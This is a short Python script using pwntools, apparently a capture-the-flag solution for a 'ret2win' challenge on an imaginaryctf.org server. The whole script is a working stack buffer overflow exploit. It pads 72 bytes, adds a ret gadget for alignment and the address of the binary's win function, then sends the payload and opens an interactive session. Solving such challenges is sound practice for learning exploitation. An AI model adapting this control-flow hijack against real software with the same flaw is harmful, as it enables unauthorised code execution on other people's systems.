from pwn import *

e = ELF('./vuln')
p = remote('ret2win.chal.imaginaryctf.org', 1337)
print(p.recvline().decode('ascii'))

payload = b'A' * 72
win = p64(e.symbols['win'])
ret = p64(0x401198)
payload += ret
payload += win

p.sendline(payload)
p.interactive()
